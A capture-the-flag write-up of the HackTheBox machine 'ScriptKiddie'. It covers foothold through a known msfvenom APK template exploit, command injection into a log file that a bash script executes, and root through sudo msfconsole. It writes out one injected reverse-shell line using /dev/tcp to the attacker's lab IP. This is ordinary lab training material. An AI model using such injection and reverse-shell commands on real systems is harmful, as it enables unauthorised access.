# ScriptKiddie

## Gaining Access

Nmap scan:

![](<../../../.gitbook/assets/image%20(3529).png>)

### Hacker Tools

Port 5000 presented a website where we could use tools like `nmap` and `msfvenom`:

![](<../../../.gitbook/assets/image%20(748).png>)

We can try it out and it works:

![](<../../../.gitbook/assets/image%20(3663).png>)

I tested all forms of command injection, but nothing worked. So, I started checking whether the tools themselves had exploits, and I was surprised to see that `msfvenom` was exploitable:

{% embed url="https://www.exploit-db.com/exploits/49491" %}

We just need to replace the payload in the PoC to a reverse shell and generate the APK file:

![](<../../../.gitbook/assets/image%20(2452).png>)

Afterwards, we can upload this as a template file on the machine and change the LHOST to our IP address:

![](<../../../.gitbook/assets/image%20(2606).png>)

Then we would get a shell:

![](<../../../.gitbook/assets/image%20(410).png>)

## Privilege Escalation

### To Pwn

There was another user named `pwn` on the machine, so that's probably the next path. Within the home directory of `pwn`, we can see two other files:

![](<../../../.gitbook/assets/image%20(2863).png>)

The `bash` script was running some kind of logger that reads input from `/home/kid/logs/hackers` and executes commands based on it. Take note that we have control over this file.

![](<../../../.gitbook/assets/image%20(2331).png>)

Now, we can see how the `${ip}` variable is not being sanitised and is run with `sh -c`, so this is our RCE point. Some testing revealed that the format of the log written is `[2021-05-28 12:37:32.655374] 10.10.16.9`. We can append a reverse shell to the end:

```
[2021-05-28 12:37:32.655374] 10.10.16.9 | bash -c 'bash -i >& /dev/tcp/10.10.16.9/8080 0>&1' #" > /home/kid/logs/hackers
```

After echoing it in, we would gain anoter reverse shell:

![](<../../../.gitbook/assets/image%20(3674).png>)

### Sudo MSFConsole

When checking `sudo` privileges, we see that we can run `msfconsole` as root.

![](<../../../.gitbook/assets/image%20(3474).png>)

The thing about `msfconsole` is that we can run shell commands in it. In short, we have root privileges just by doing `sudo msfconsole`:

![](<../../../.gitbook/assets/image%20(1874).png>)

Rooted!
